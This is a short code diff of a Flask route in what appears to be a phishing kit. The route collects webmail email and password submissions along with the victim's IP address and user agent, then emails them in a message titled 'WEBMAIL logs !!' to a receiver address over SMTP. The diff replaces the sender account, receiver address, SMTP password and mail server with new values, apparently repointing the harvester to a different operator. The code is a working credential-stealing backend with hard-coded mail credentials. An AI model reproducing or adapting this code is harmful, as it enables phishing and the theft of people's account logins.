@@ -196,10 +196,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "missdomn@cinconn.com"
+        sender_email = "rtinh@greatest-vitamins.com  "
         sender_emaill = "eissa"
-        receiver_email = "aragon.rheece@minuteafter.com"
-        password = "X9kAxykLjkks"
+        receiver_email = "zeeskollectz@gmail.com"
+        password = "myworldWORK2026"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL logs !! "
@@ -215,7 +215,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("cinconn.com", 465) as server:
+        with smtplib.SMTP_SSL("smtpdm-eu-central-1.aliyuncs.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
